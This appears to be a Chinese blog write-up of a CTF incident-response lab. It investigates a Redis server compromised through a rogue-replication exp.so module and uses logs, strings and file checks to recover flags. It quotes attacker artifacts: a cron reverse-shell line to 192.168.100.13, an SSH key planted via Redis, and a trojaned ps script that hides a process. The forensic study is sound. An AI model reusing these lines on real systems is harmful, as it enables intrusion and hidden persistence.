---
layout: config.default_layout
title: 玄机-第二章 日志分析-redis应急响应
date: 2025-04-04 00:36:35
updated: 2025-04-04 00:37:08
comments: true
tags: [玄机,应急响应,日志分析]
categories: 靶机
---

# 第二章 日志分析-redis应急响应

1. 通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少，将黑客 IP 作为 FLAG 提交
    
    日志文件存在`/var/log/redis.log` ，其中`192.168.100.13` 出现了很多
    
    ```bash
    419:S 31 Jul 2023 05:33:21.623 * Connecting to MASTER 192.168.100.13:8888
    419:S 31 Jul 2023 05:33:21.623 * MASTER <-> REPLICA sync started
    419:S 31 Jul 2023 05:33:21.624 # Error condition on socket for SYNC: Connection refused
    419:S 31 Jul 2023 05:33:22.625 * Connecting to MASTER 192.168.100.13:8888
    419:S 31 Jul 2023 05:33:22.625 * MASTER <-> REPLICA sync started
    419:S 31 Jul 2023 05:33:22.626 # Error condition on socket for SYNC: Connection refused
    419:S 31 Jul 2023 05:33:23.627 * Connecting to MASTER 192.168.100.13:8888
    419:S 31 Jul 2023 05:33:23.627 * MASTER <-> REPLICA sync started
    419:S 31 Jul 2023 05:33:23.628 # Error condition on socket for SYNC: Connection refused
    419:S 31 Jul 2023 05:33:24.628 * Connecting to MASTER 192.168.100.13:8888
    419:S 31 Jul 2023 05:33:24.629 * MASTER <-> REPLICA sync started
    419:S 31 Jul 2023 05:33:24.630 # Error condition on socket for SYNC: Connection refused
    419:S 31 Jul 2023 05:33:25.631 * Connecting to MASTER 192.168.100.13:8888
    419:S 31 Jul 2023 05:33:25.631 * MASTER <-> REPLICA sync started
    419:S 31 Jul 2023 05:33:25.632 # Error condition on socket for SYNC: Connection refused
    419:S 31 Jul 2023 05:33:26.633 * Connecting to MASTER 192.168.100.13:8888
    419:S 31 Jul 2023 05:33:26.633 * MASTER <-> REPLICA sync started
    419:S 31 Jul 2023 05:33:26.634 # Error condition on socket for SYNC: Connection refused
    419:S 31 Jul 2023 05:33:27.635 * Connecting to MASTER 192.168.100.13:8888
    419:S 31 Jul 2023 05:33:27.635 * MASTER <-> REPLICA sync started
    419:S 31 Jul 2023 05:33:27.636 # Error condition on socket for SYNC: Connection refused
    419:S 31 Jul 2023 05:33:28.637 * Connecting to MASTER 192.168.100.13:8888
    419:S 31 Jul 2023 05:33:28.637 * MASTER <-> REPLICA sync started
    419:S 31 Jul 2023 05:33:28.638 # Error condition on socket for SYNC: Connection refused
    419:S 31 Jul 2023 05:33:29.639 * Connecting to MASTER 192.168.100.13:8888
    419:S 31 Jul 2023 05:34:02.720 # Error condition on socket for SYNC: Connection refused
    419:S 31 Jul 2023 05:34:03.034 * REPLICAOF 192.168.31.55:8888 enabled (user request from 'id=5 addr=192.168.200.2:64319 fd=7 name= age=0 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=47 qbuf-free=32721 obl=0 oll=0 omem=0 events=r cmd=slaveof')
    419:S 31 Jul 2023 05:34:03.722 * Connecting to MASTER 192.168.31.55:8888
    419:S 31 Jul 2023 05:34:03.722 * MASTER <-> REPLICA sync started
    419:S 31 Jul 2023 05:34:33.173 * REPLICAOF 192.168.100.20:8888 enabled (user request from 'id=6 addr=192.168.200.2:64339 fd=7 name= age=0 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=48 qbuf-free=32720 obl=0 oll=0 omem=0 events=r cmd=slaveof')
    419:S 31 Jul 2023 05:34:33.786 * Connecting to MASTER 192.168.100.20:8888
    419:S 31 Jul 2023 05:34:33.786 * MASTER <-> REPLICA sync started
    419:S 31 Jul 2023 05:34:33.788 * Non blocking connect for SYNC fired the event.
    419:S 31 Jul 2023 05:34:35.192 * Master replied to PING, replication can continue...
    419:S 31 Jul 2023 05:34:35.194 * Trying a partial resynchronization (request 7a73a1a4297a16c50d8465b0cc432444f0e5df71:1).
    419:S 31 Jul 2023 05:34:35.195 * Full resync from master: ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ:1
    419:S 31 Jul 2023 05:34:35.195 * Discarding previously cached master state.
    419:S 31 Jul 2023 05:34:35.195 * MASTER <-> REPLICA sync: receiving 48040 bytes from master
    ```
    
    但是看日志`192.168.100.13`没有登陆成功，`192.168.100.20`登陆成功了
    
    ```bash
    flag{192.168.100.20}
    ```
    
2. 通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件，将黑客上传的恶意文件里面的 FLAG 提交
    
    在日志中能看到尝试加载`exp.so`
    
    ```bash
    S 31 Jul 2023 05:34:35.195 * Discarding previously cached master state.
    419:S 31 Jul 2023 05:34:35.195 * MASTER <-> REPLICA sync: receiving 48040 bytes from master
    419:S 31 Jul 2023 05:34:35.197 * MASTER <-> REPLICA sync: Flushing old data
    419:S 31 Jul 2023 05:34:35.197 * MASTER <-> REPLICA sync: Loading DB in memory
    419:S 31 Jul 2023 05:34:35.197 # Wrong signature trying to load DB from file
    419:S 31 Jul 2023 05:34:35.197 # Failed trying to load the MASTER synchronization DB from disk
    419:S 31 Jul 2023 05:34:35.791 * Connecting to MASTER 192.168.100.20:8888
    419:S 31 Jul 2023 05:34:35.791 * MASTER <-> REPLICA sync started
    419:S 31 Jul 2023 05:34:35.792 * Non blocking connect for SYNC fired the event.
    419:S 31 Jul 2023 05:34:37.205 * Module 'system' loaded from ./exp.so
    ```
    
    ```bash
    root@ip-10-0-10-1:/tmp# find / -name *exp.so*
    /exp.so
    /usr/lib/x86_64-linux-gnu/rsyslog/lmregexp.so
    ```
    
    因为时二进制文件，通过`strings`命令来读取
    
    ```bash
    root@ip-10-0-10-1:/tmp# strings /exp.so 
    ....
    flag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b}
    ....
    ```
    
3. 通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少，将反弹 shell 的IP 作为 FLAG 提交
    
    通过日志，可以能看到两个IP，一般就是反弹shell
    
    ```bash
    419:S 31 Jul 2023 05:33:15.065 * REPLICAOF 192.168.100.13:8888 enabled (user request from 'id=3 addr=192.168.200.2:64289 fd=7 name= age=0 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=48 qbuf-free=32720 obl=0 oll=0 omem=0 events=r cmd=slaveof')
    ```
    
    这条日志表明副本（Replica）的 `REPLICAOF` 命令被更改，使其从 `192.168.100.13:8888` 这个新的主服务器同步。这种更改是由客户端 `id=3` 发送的，该客户端的 IP 地址是 `192.168.200.2`，使用端口 `64289` 进行连接。
    
    ```bash
    
    flag{192.168.100.13}
    ```
    
    并且通过Redis未授权访问获得`shell`的方法其实也就几种，例如：定时任务，SSH公钥，写入`WebShell`等
    
    查看计划任务
    
    ```bash
    root@ip-10-0-10-1:/tmp# crontab -l
    # Edit this file to introduce tasks to be run by cron.
    # 
    # Each task to run has to be defined through a single line
    # indicating with different fields when the task will be run
    # and what command to run for the task
    # 
    # To define the time you can provide concrete values for
    # minute (m), hour (h), day of month (dom), month (mon),
    # and day of week (dow) or use '*' in these fields (for 'any').
    # 
    # Notice that tasks will be started based on the cron's system
    # daemon's notion of time and timezones.
    # 
    # Output of the crontab jobs (including errors) is sent through
    # email to the user the crontab file belongs to (unless redirected).
    # 
    # For example, you can run a backup of all your user accounts
    # at 5 a.m every week with:
    # 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
    # 
    # For more information see the manual pages of crontab(5) and cron(8)
    # 
    */1 * * * *  /bin/sh -i >& /dev/tcp/192.168.100.13/7777 0>&1
    # m h  dom mon dow   command
    ```
    
    其中就有反弹`shell`的命令
    
4. 通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag{黑客的用户-关键字符串} 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交
    
    通过strings读取exp.so的字符串没有找到类似用户名的字符串
    
    查看公钥文件能看到通过`Redis`写入的痕迹，后面跟着的标识`xj-test-user` 可能就是用户名
    
    ```bash
    root@ip-10-0-10-1:~/.ssh# cat authorized_keys 
    REDIS0009�      redis-ver5.0.1�
    �edis-bits�@�ctime�tO�dused-mem�XU
     aof-preamble���xxsshB9
    
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDh4OEFvyb4ubM7YPvzG/FfO6jE4PjLdmuCUdGP+aeLeJB5SXYT6zHkU9wlfY/Fo4UuBlhTqBaS6Ih/Wf62KepzrMsTQQYcSG/Xp8lgFzVCCFAk7apzxfRCPNk1pxaGiEF6MPoCmUu1UhC3ta3xyh2c4KZls0hyFN9JZsuD+siT8KVqm856vQ+RaTrZi3ThMa5gbeH+v3ZUcO35ZfMKor/uWXffHT0Yi06dsgIMN3faIiBrd1Lg0B5kOTaDq3fHs8Qs7pvR9C4ZTm2AK/Oct8ULdsnfS2YWtrYyC8rzNip9Wf083ZY1B4bj1UoxD+QwgThh5VP3xgRd9KDSzEYIBabstGh8GU5zDxr0zIuhQM35I0aALvojXl4QaaEnZwpqU3ZkojPG2aNC0QdiBK7eKwA38Gk+V8DEWc/TTkO+wm3aXYdll5sPmoWTAonaln1nmCiTDn4jKb73DxYHfSgNIDpJ6fS5kbWL5UJnElWCrxzaXKHUlqXJj3x81Oz6baFNv8= xj-test-user
    ```
    
    通过用户名到`Github`去找工具，能找到：https://github.com/xj-test-user/redis-rogue-getshell
    
    藏得挺深的（看了WP）
    
    ![image.png](image3.png)
    
    那么Flag就是
    
    ```bash
    flag{xj-test-user-wow-you-find-flag}
    ```
    
5. 通过本地 PC SSH到服务器并且分析黑客篡改的命令，将黑客篡改的命令里面的关键字符串作为 FLAG 提交
    
    如果出现篡改命令，那么篡改的应该是`/usr/bin` 里面的
    
    ```bash
    root@ip-10-0-10-1:/usr/bin# ls -lt | head -n 10
    total 197500
    -rwxrwxrwx 1 root root         178 Jul 31  2023 ps
    -rwxr-xr-x 1 root root      133432 Jul 31  2023 ps_
    lrwxrwxrwx 1 root root          25 Jul 31  2023 aclocal -> /etc/alternatives/aclocal
    lrwxrwxrwx 1 root root          26 Jul 31  2023 automake -> /etc/alternatives/automake
    lrwxrwxrwx 1 root root          21 Jul 31  2023 c99 -> /etc/alternatives/c99
    lrwxrwxrwx 1 root root          21 Jul 31  2023 c89 -> /etc/alternatives/c89
    lrwxrwxrwx 1 root root          20 Jul 31  2023 cc -> /etc/alternatives/cc
    -rwxr-xr-x 1 root root    14663096 Jun 29  2023 amazon-ssm-agent
    -rwxr-xr-x 1 root root    24088632 Jun 29  2023 ssm-agent-worker
    ```
    
    有两个`ps`不对劲
    
    ```bash
    root@ip-10-0-10-1:/usr/bin# cat ps
    #/bin/bash
    oldifs="$IFS"
    IFS='\$n'
    result=$(ps_ $1 $2 $3|grep -v 'threadd' )
    for v in $result;
    do
            echo -e "$v\t";
    done
    IFS="$oldifs"
    #//c195i2923381905517d818e313792d196
    ```
    
    黑客对`ps`做了备份为`ps_` ,并且把结果中带有`threadd` 进程的结果排除掉了
    
    那么`Flag` 应该就是
    
    ```bash
    flag{c195i2923381905517d818e313792d196}
    ```